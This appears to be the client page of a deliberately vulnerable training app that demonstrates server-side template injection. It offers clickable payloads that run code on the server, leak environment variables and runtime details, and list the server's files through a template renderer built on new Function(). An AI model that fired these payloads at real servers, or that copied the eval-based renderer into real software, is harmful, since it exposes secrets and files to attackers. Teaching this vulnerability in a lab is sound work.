/**
 * Vulnerability: Server-Side Template Injection (SSTI)
 * Source: form input → POST /api/render
 * Sink: renderTemplate() compiles `<%= expr %>` via `new Function()`
 * CWE-94 · OWASP A03:2021
 *
 * Payloads (use the buttons below):
 *   Hello <%= user %>!                                      benign
 *   <%= 7*7 %>                                              arithmetic — confirms code execution
 *   <%= process.env %>                                      leak server env vars
 *   <%= process.versions %>                                 leak runtime info
 *   <%= require('os').hostname() %>                         host name
 *   <%= require('fs').readdirSync('.') %>                   directory listing
 */
"use client";

import { useState } from "react";

const payloads = [
  { p: "Hello <%= user %>!", note: "benign — context lookup" },
  { p: "<%= 7*7 %>", note: "arithmetic — confirms code execution" },
  { p: "<%= process.env %>", note: "leak server environment variables" },
  { p: "<%= process.versions %>", note: "leak runtime versions" },
  { p: "<%= require('os').hostname() %>", note: "leak host name" },
  {
    p: "<%= require('fs').readdirSync('.') %>",
    note: "list files in the working directory",
  },
];

export default function SstiPage() {
  const [template, setTemplate] = useState("Hello <%= user %>!");
  const [output, setOutput] = useState("");
  const [error, setError] = useState("");

  async function render(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    setOutput("");
    const res = await fetch("/api/render", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ template }),
    });
    const data = await res.json();
    if (data.error) {
      setError(data.error);
      return;
    }
    setOutput(data.output ?? "");
  }

  return (
    <div style={{ padding: 24, fontFamily: "system-ui, sans-serif" }}>
      <h1>SSTI Demo (EJS-style template)</h1>
      <p>
        The server evaluates anything between <code>&lt;%=</code> and{" "}
        <code>%&gt;</code> as JavaScript via <code>new Function()</code>. Any
        expression you send runs inside the Node.js process.
      </p>

      <form onSubmit={render} style={{ margin: "16px 0" }}>
        <textarea
          value={template}
          onChange={(e) => setTemplate(e.target.value)}
          rows={4}
          style={{
            width: "100%",
            maxWidth: 720,
            padding: 8,
            fontFamily: "monospace",
            border: "1px solid #888",
          }}
        />
        <div>
          <button type="submit" style={{ padding: "6px 12px", marginTop: 8 }}>
            Render
          </button>
        </div>
      </form>

      <h3>Payloads to try (click to fill)</h3>
      <ul style={{ listStyle: "none", padding: 0 }}>
        {payloads.map(({ p, note }) => (
          <li key={p} style={{ margin: "4px 0" }}>
            <button
              type="button"
              onClick={() => setTemplate(p)}
              style={{
                fontFamily: "monospace",
                padding: "4px 8px",
                border: "1px solid #888",
                background: "transparent",
                color: "inherit",
                cursor: "pointer",
                marginRight: 8,
              }}
            >
              {p}
            </button>
            <span style={{ color: "#888" }}>— {note}</span>
          </li>
        ))}
      </ul>

      {error && (
        <pre style={{ background: "#400", color: "#fbb", padding: 12 }}>
          {error}
        </pre>
      )}

      {output && (
        <>
          <h3>Rendered output</h3>
          <pre
            style={{
              background: "#111",
              color: "#0f0",
              padding: 12,
              whiteSpace: "pre-wrap",
              wordBreak: "break-all",
            }}
          >
            {output}
          </pre>
        </>
      )}
    </div>
  );
}
